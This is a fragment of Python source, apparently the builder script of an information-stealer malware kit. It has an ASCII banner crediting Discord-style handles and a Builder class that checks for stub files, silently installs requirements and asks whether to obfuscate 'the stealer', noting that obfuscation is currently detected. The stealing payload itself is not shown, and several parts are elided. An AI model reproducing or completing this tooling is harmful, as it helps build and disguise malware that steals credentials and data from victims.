...
| $$  | $$| $$_____/| $$  | $$| $$  | $$| $$ /$$__  $$      | $$      | $$  | $$| $$  | $$| $$  | $$| $$_____/| $$      
| $$  | $$|  $$$$$$$| $$$$$$$/|  $$$$$$/| $$|  $$$$$$$      | $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$      
|__/  |__/ \_______/|_______/  \______/ |__/ \_______/      |________/ \______/  \____  $$ \____  $$ \_______/|__/      
                                                                                 /$$  \ $$ /$$  \ $$                    
                                                                                |  $$$$$$/|  $$$$$$/                    
                                                                                 \______/  \______/                                                                                                   
                                                                    made by ! LO$R#0001 for nebula#0689\n""")
...
class Builder:
    def __init__(self) -> None:
        ...
        self.obfuscation = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Obfuscate the stealer (recommend no bc obfuscation is detected rn, LO$R will fix it later)? (yes/no): "
        )
    ...
    def check(self):
        required_files = {"./stubs/main.py", "./stubs/requirements.txt", "./stubs/obfuscation.py"}
        ...
        os.system(f"pip install --upgrade -r {'stubs/requirements.txt'} > {os.devnull} 2>&1")
        print(
            f"{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] All requirements installed!"
        )
        time.sleep(1)
        return True
